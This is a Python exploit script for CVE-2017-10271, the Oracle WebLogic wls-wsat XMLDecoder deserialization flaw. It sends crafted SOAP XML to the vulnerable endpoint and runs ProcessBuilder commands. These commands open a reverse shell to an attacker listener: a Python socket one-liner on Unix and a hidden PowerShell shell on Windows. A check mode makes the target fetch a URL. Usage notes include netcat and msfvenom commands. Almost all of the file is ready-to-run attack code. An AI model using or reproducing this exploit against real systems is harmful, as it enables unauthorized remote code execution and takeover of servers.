#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Exploit Title: Weblogic wls-wsat Component Deserialization RCE
# Date Authored: Jan 3, 2018
# Date Announced: 10/19/2017
# Exploit Author: Kevin Kirsche (d3c3pt10n)
# Exploit Github: https://github.com/kkirsche/CVE-2017-10271
#     Exploit is based off of POC by Luffin from Github
#     https://github.com/Luffin/CVE-2017-10271
# Vendor Homepage: http://www.oracle.com/technetwork/middleware/weblogic/overview/index.html
# Version: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
# Tested on: Oracle WebLogic 10.3.6.0.0 running on Oracle Linux 6.8 and Ubuntu 14.04.4 LTS
# CVE: CVE-2017-10271
# Usage: python exploit.py -l 10.10.10.10 -p 4444 -r http://will.bepwned.com:7001/
#   (Python 3) Example check listener: python3 -m http.server 4444
#   (Python 2) Example check listener: python -m SimpleHTTPServer 4444
#   (Netcat) Example exploit listener: nc -nlvp 4444

from sys import exit
from requests import post
from argparse import ArgumentParser
from random import choice
from string import ascii_uppercase, ascii_lowercase, digits
from xml.sax.saxutils import escape

class Exploit:

    def __init__(self, check, rhost, lhost, lport, windows):
        self.url = rhost if not rhost.endswith('/') else rhost.strip('/')
        self.lhost = lhost
        self.lport = lport
        self.check = check
        if windows:
            self.target = 'win'
        else:
            self.target = 'unix'

        if self.target == 'unix':
            # Unix reverse shell
            # You should also be able to instead use something from MSFVenom. E.g.
            # msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444
            self.cmd_payload = (
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."
                "SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2("
                "s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ).format(lhost=self.lhost, lport=self.lport)
        else:
            # Windows reverse shell
            # Based on msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4444
            self.cmd_payload = (
                r"powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) "
                r"{$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='" + self.lhost +""
                r"';$p='"+ self.lport + "';$c=New-Object system.net.sockets.tcpclient;$c.connect($a"
                r",$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
                r"$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"
                r"$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"
                r"$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"
                r"$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"
                r"while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};"
                r"$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;"
                r"while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0)"
                r" -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;"
                r"if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};"
                r"if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if "
                r"($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne"
                r" -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e."
                r"GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};"
            )
        self.cmd_payload = escape(self.cmd_payload)

    def cmd_base(self):
        if self.target == 'win':
            return 'cmd'
        return '/bin/sh'

    def cmd_opt(self):
        if self.target == 'win':
            return '/c'
        return '-c'


    def get_generic_check_payload(self):
        random_uri = ''.join(
            choice(ascii_uppercase + ascii_lowercase + digits)
            for _ in range(16))
        generic_check_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <object id="url" class="java.net.URL">
          <string>http://{lhost}:{lport}/{random_uri}</string>
        </object>
        <object idref="url">
          <void id="stream" method = "openStream" />
        </object>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''

        return generic_check_payload.format(
            lhost=self.lhost, lport=self.lport, random_uri=random_uri)

    def get_process_builder_payload(self):
        process_builder_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>{cmd_base}</string>
            </void>
            <void index="1">
              <string>{cmd_opt}</string>
            </void>
            <void index="2">
              <string>{cmd_payload}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''
        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),
                                      cmd_payload=self.cmd_payload)

    def print_banner(self):
        print("=" * 80)
        print("CVE-2017-10271 RCE Exploit")
        print("written by: Kevin Kirsche (d3c3pt10n)")
        print("Remote Target: {rhost}".format(rhost=self.url))
        print("Shell Listener: {lhost}:{lport}".format(
            lhost=self.lhost, lport=self.lport))
        print("=" * 80)

    def post_exploit(self, data):
        headers = {
            "Content-Type":
            "text/xml;charset=UTF-8",
            "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        }
        payload = "/wls-wsat/CoordinatorPortType"

        vulnurl = self.url + payload
        try:
            req = post(
                vulnurl, data=data, headers=headers, timeout=10, verify=False)
            if self.check:
                print("[*] Did you get an HTTP GET request back?")
            else:
                print("[*] Did you get a shell back?")
        except Exception as e:
            print('[!] Connection Error')
            print(e)

    def run(self):
        self.print_banner()
        if self.check:
            print('[+] Generating generic check payload')
            payload = self.get_generic_check_payload()
        else:
            print('[+] Generating execution payload')
            payload = self.get_process_builder_payload()
        print('[*] Generated:')
        print(payload)
        if self.check:
            print('[+] Running generic check payload')
        else:
            print('[+] Running {target} execute payload').format(target=self.target)

        self.post_exploit(data=payload)


if __name__ == "__main__":
    parser = ArgumentParser(
        description=
        'CVE-2017-10271 Oracle WebLogic Server WLS Security exploit. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0.'
    )
    parser.add_argument(
        '-l',
        '--lhost',
        required=True,
        dest='lhost',
        nargs='?',
        help='The listening host that the remote server should connect back to')
    parser.add_argument(
        '-p',
        '--lport',
        required=True,
        dest='lport',
        nargs='?',
        help='The listening port that the remote server should connect back to')
    parser.add_argument(
        '-r',
        '--rhost',
        required=True,
        dest='rhost',
        nargs='?',
        help='The remote host base URL that we should send the exploit to')
    parser.add_argument(
        '-c',
        '--check',
        dest='check',
        action='store_true',
        help=
        'Execute a check using HTTP to see if the host is vulnerable. This will cause the host to issue an HTTP request. This is a generic check.'
    )
    parser.add_argument(
        '-w',
        '--win',
        dest='windows',
        action='store_true',
        help=
        'Use the windows cmd payload instead of unix payload (execute mode only).'
    )

    args = parser.parse_args()

    exploit = Exploit(
        check=args.check, rhost=args.rhost, lhost=args.lhost, lport=args.lport,
        windows=args.windows)
    exploit.run()